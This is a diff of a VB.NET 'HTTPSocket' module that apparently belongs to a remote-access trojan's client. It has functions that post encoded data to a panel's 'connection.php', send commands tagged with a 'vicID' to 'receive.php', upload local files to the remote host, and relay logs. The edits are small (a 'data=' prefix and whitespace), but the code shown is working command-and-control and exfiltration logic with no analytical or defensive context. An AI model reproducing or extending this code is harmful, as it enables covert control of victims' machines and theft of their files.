@@ -9,7 +9,7 @@ Namespace HTTPSocket
 
         Public Function Connect()
             Try
-                _POST("connection.php", ENB(ID & Y & Data))
+                _POST("connection.php", "data=" & ENB(ID & Y & Data))
                 Return True
             Catch ex As Exception
                 Return False
@@ -24,6 +24,7 @@ Namespace HTTPSocket
             output = output.Replace("/", "_")
             ENB = output
         End Function
+    
         Public Function DEB(ByRef s As String) As String
             Dim output = s
             output = output.Replace("-", "+")
@@ -48,6 +49,7 @@ Namespace HTTPSocket
                 Return ex.Message
             End Try
         End Function
+    
         Public Function _POST(ByVal filename As String, ByVal requst As String)
             Try
                 Dim s As HttpWebRequest
@@ -71,6 +73,7 @@ Namespace HTTPSocket
                 Return ex.Message
             End Try
         End Function
+
         Public Function Send(ByVal Command As String)
             Try
                 _GET(Host & "/" & "receive.php?command=" & ENB(Command) & "&vicID=" & ENB(ID))
@@ -79,6 +82,7 @@ Namespace HTTPSocket
                 Return ex.Message
             End Try
         End Function
+
         Public Function Upload(ByVal Filepath As String)
             Try
                 Dim Socket As New WebClient
@@ -88,10 +92,12 @@ Namespace HTTPSocket
                 Return ex.Message
             End Try
         End Function
+
         Public Function Log(ByVal Type As String, ByVal Message As String)
             Send("NewLog" & Y & Type & Y & Message)
             Return True
         End Function
+
         Public Function IsPanel(ByVal PanelURL As String)
             Dim url As New System.Uri(PanelURL)
             Dim req As System.Net.WebRequest
